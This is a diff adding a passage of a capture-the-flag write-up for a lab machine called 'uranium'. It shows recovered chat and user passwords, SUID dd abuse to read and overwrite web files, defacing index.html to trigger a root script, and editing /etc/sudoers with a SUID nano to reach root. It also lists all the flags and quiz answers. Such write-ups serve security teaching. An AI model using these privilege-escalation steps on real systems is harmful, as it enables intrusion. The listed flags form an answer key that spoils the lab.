@@ -348,3 +348,353 @@ HTTP request sent, awaiting response... 200 OK
 Length: 1869 (1.8K) [application/vnd.tcpdump.pcap]
 Saving to: ‘hakanbey_network_log.pcap’
 
+hakanbey_network 100%[=========>]   1.83K  --.-KB/s    in 0s      
+
+(46.9 MB/s) - ‘hakanbey_network_log.pcap’ saved [1869/1869]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wireshark hakanbey_network_log.pcap 
+
+Follow TCP
+
+MBMD1vdpjg3kGv6SsIz56VNG
+Hi Kral4
+Hi bro
+I forget my password, do you know my password ?
+Yes, wait a sec I'll send you.
+Oh , yes yes I remember. No need anymore. Ty..
+Okay bro, take care !
+
+hakanbey@uranium:~$ ./chat_with_kral4
+./chat_with_kral4
+PASSWORD :MBMD1vdpjg3kGv6SsIz56VNG
+MBMD1vdpjg3kGv6SsIz56VNG
+kral4:hi hakanbey
+
+->Hi Kral4
+Hi Kral4
+hakanbey:Hi Kral4
+
+->hi
+hi
+hakanbey:hi
+kral4:how are you?
+
+->fine and you
+fine and you
+hakanbey:fine and you
+kral4:what now? did you forgot your password again
+
+->yes
+yes
+hakanbey:yes
+kral4:okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE
+kral4:i have to go
+kral4 disconnected
+
+connection terminated
+
+hakanbey@uranium:~$ sudo -l
+sudo -l
+[sudo] password for hakanbey: Mys3cr3tp4sw0rD
+
+Matching Defaults entries for hakanbey on uranium:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hakanbey may run the following commands on uranium:
+    (kral4) /bin/bash
+hakanbey@uranium:~$ sudo -u kral4 /bin/bash
+sudo -u kral4 /bin/bash
+kral4@uranium:~$ cd /home
+cd /home
+kral4@uranium:/home$ ls
+ls
+hakanbey  kral4
+kral4@uranium:/home$ cd kral4
+cd kral4
+kral4@uranium:/home/kral4$ ls
+ls
+chat_with_hakanbey  user_2.txt
+kral4@uranium:/home/kral4$ cat user_2.txt
+cat user_2.txt
+thm{804d12e6d16189075db2d45449aeda5f}
+
+kral4@uranium:/home/kral4$ find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/sudo
+/bin/umount
+/bin/ping
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/dd
+kral4@uranium:/home/kral4$ find / -type f -name web_flag.txt  2>/dev/null
+find / -type f -name web_flag.txt  2>/dev/null
+/var/www/html/web_flag.txt
+kral4@uranium:/home/kral4$ cat /var/www/html/web_flag.txt
+cat /var/www/html/web_flag.txt
+cat: /var/www/html/web_flag.txt: Permission denied
+
+LFILE=file_to_read
+dd if=$LFILE
+
+kral4@uranium:/home/kral4$ /bin/dd if=/var/www/html/web_flag.txt
+/bin/dd if=/var/www/html/web_flag.txt
+thm{019d332a6a223a98b955c160b3e6750a}
+0+1 records in
+0+1 records out
+38 bytes copied, 0.000742536 s, 51.2 kB/s
+
+kral4@uranium:/var/mail$ cat kral4
+cat kral4
+From root@uranium.thm  Sat Apr 24 13:22:02 2021
+Return-Path: <root@uranium.thm>
+X-Original-To: kral4@uranium.thm
+Delivered-To: kral4@uranium.thm
+Received: from uranium (localhost [127.0.0.1])
+	by uranium (Postfix) with ESMTP id C7533401C2
+	for <kral4@uranium.thm>; Sat, 24 Apr 2021 13:22:02 +0000 (UTC)
+Message-ID: <841530.943147035-sendEmail@uranium>
+From: "root@uranium.thm" <root@uranium.thm>
+To: "kral4@uranium.thm" <kral4@uranium.thm>
+Subject: Hi Kral4
+Date: Sat, 24 Apr 2021 13:22:02 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-992935.514616878
+Content-Type: text/plain;
+        charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.
+
+------MIME delimiter for sendEmail-992935.514616878--
+
+kral4@uranium:/var/mail$ cp /bin/nano /home/kral4/
+
+cp /bin/nano /home/kral4/
+kral4@uranium:/var/mail$ 
+
+LFILE=file_to_write
+echo "DATA" | dd of=$LFILE
+
+kral4@uranium:/var/mail$ echo "hacked" | dd of=/var/www/html/index.html
+echo "hacked" | dd of=/var/www/html/index.html
+0+1 records in
+0+1 records out
+7 bytes copied, 0.000149922 s, 46.7 kB/s
+kral4@uranium:/var/mail$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
+< -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
+-rwsrwxrwx 1 root root 245872 Jul 19 02:09 /home/kral4/nano
+-rwsr-xr-x 1 root root 113528 Feb  2  2021 /usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
+-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
+-rwsr-x--- 1 web kral4 76000 Apr 23  2021 /bin/dd
+
+kral4@uranium:/var/mail$ ls
+ls
+hakanbey  kral4
+You have new mail in /var/mail/kral4
+kral4@uranium:/var/mail$ cat kral4
+cat kral4
+From root@uranium.thm  Sat Apr 24 13:22:02 2021
+Return-Path: <root@uranium.thm>
+X-Original-To: kral4@uranium.thm
+Delivered-To: kral4@uranium.thm
+Received: from uranium (localhost [127.0.0.1])
+	by uranium (Postfix) with ESMTP id C7533401C2
+	for <kral4@uranium.thm>; Sat, 24 Apr 2021 13:22:02 +0000 (UTC)
+Message-ID: <841530.943147035-sendEmail@uranium>
+From: "root@uranium.thm" <root@uranium.thm>
+To: "kral4@uranium.thm" <kral4@uranium.thm>
+Subject: Hi Kral4
+Date: Sat, 24 Apr 2021 13:22:02 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-992935.514616878
+Content-Type: text/plain;
+        charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.
+
+------MIME delimiter for sendEmail-992935.514616878--
+
+From root@uranium.thm  Wed Jul 19 02:10:19 2023
+Return-Path: <root@uranium.thm>
+X-Original-To: kral4@uranium.thm
+Delivered-To: kral4@uranium.thm
+Received: from uranium (localhost [127.0.0.1])
+	by uranium (Postfix) with ESMTP id BD58D401AC
+	for <kral4@uranium.thm>; Wed, 19 Jul 2023 02:10:19 +0000 (UTC)
+Message-ID: <424705.819550098-sendEmail@uranium>
+From: "root@uranium.thm" <root@uranium.thm>
+To: "kral4@uranium.thm" <kral4@uranium.thm>
+Subject: Hi Kral4
+Date: Wed, 19 Jul 2023 02:10:19 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-956349.443717958"
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-956349.443717958
+Content-Type: text/plain;
+        charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+I think our index page has been hacked again. You know how to fix it, I am giving authorization.
+
+------MIME delimiter for sendEmail-956349.443717958--
+
+kral4@uranium:/home/kral4$ ls -lah
+ls -lah
+total 384K
+drwxr-x--- 3 kral4 kral4 4.0K Jul 19 02:09 .
+drwxr-xr-x 4 root  root  4.0K Apr 23  2021 ..
+lrwxrwxrwx 1 root  root     9 Apr 25  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 kral4 kral4  220 Apr  9  2021 .bash_logout
+-rw-r--r-- 1 kral4 kral4 3.7K Apr  9  2021 .bashrc
+-rwxr-xr-x 1 kral4 kral4 108K Apr  9  2021 chat_with_hakanbey
+-rw-r--r-- 1 kral4 kral4    5 Jul 19 01:54 .check
+drwxrwxr-x 3 kral4 kral4 4.0K Apr 10  2021 .local
+-rwsrwxrwx 1 root  root  241K Jul 19 02:09 nano
+-rw-r--r-- 1 kral4 kral4  807 Apr  9  2021 .profile
+-rw-rw-r-- 1 kral4 kral4   38 Apr 10  2021 user_2.txt
+```
+```text
+# Press Ctrl+Z
+
+stty raw -echo; fg; reset;
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;
+
+kral4@uranium:/home/kral4$ nano /etc/sudoers
+Unable to create directory /home/hakanbey/.local/share/nano/: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+kral4@uranium:/home/kral4$ ./nano /etc/sudoers
+```
+
+## Privilege Escalation
+```text
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+%hakanbey   ALL=(ALL:ALL) ALL
+
+kral4@uranium:/home/kral4$ su hakanbey
+Password: 
+hakanbey@uranium:/home/kral4$ sudo -l
+Matching Defaults entries for hakanbey on uranium:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hakanbey may run the following commands on uranium:
+    (kral4) /bin/bash
+    (ALL : ALL) ALL
+hakanbey@uranium:/home/kral4$ sudo su
+root@uranium:/home/kral4# cd /root
+root@uranium:~# ls
+htmlcheck.py  root.txt
+root@uranium:~# cat root.txt 
+thm{81498047439cc0426bafa1db5da699cd}
+root@uranium:~# cat htmlcheck.py
+import hashlib
+import os, os.path
+import time
+
+index_path = "/var/www/html/index.html"
+nano_path = "/home/kral4/nano"
+
+index_hash = hashlib.md5(open(index_path, 'rb').read()).hexdigest()
+nano_hash = hashlib.md5(open("/bin/nano", 'rb').read()).hexdigest()
+
+def check_integrity():
+    while True:
+        if hashlib.md5(open(index_path, 'rb').read()).hexdigest() != index_hash:
+            if os.path.isfile(nano_path):
+                if hashlib.md5(open(nano_path, 'rb').read()).hexdigest() != nano_hash:
+                    os.system("wall 'That is not nano, sending the cops, bye!'");
+                    os.system("wall 'That is not nano, sending the cops, bye!'");
+                    os.system("wall 'That is not nano, sending the cops, bye!'");
+                    os.system("wall 'That is not nano, sending the cops, bye!'");
+                    os.system("wall 'That is not nano, sending the cops, bye!'");
+                    time.sleep(5)
+                    os.system('shutdown now')
+                else:
+                    time.sleep(5)
+                    os.system("sendEmail -t kral4@uranium.thm -f root@uranium.thm -s 127.0.0.1 -u \"Hi Kral4\" -m \"I think our index page has been hacked again. You know how to fix it, I am giving authorization.\" -vv -o tls=no")
+                    time.sleep(10)
+                    os.system("chown root:root /home/kral4/nano && chmod 4777 /home/kral4/nano")
+                    break
+            else:
+                #no nano
+                pass
+        time.sleep(5)
+
+check_integrity()
+```
+![[Pasted image 20230718201300.png]]
+What is the required password for the chat app?
+*MBMD1vdpjg3kGv6SsIz56VNG*
+What is the password of hakanbey user?
+*Mys3cr3tp4sw0rD*
+user_1.txt
+user_2.txt
+web_flag.txt
+root.txt
+
+## Flags / Answers
+- ***thm{2aa50e58fa82244213d5438187c0da7c}***
+- ***thm{804d12e6d16189075db2d45449aeda5f}***
+- ***thm{019d332a6a223a98b955c160b3e6750a}***
+- ***thm{81498047439cc0426bafa1db5da699cd}***
+
+## Notes / Lessons Learned
+[[Digital Forensics Case B4DM755]]
+
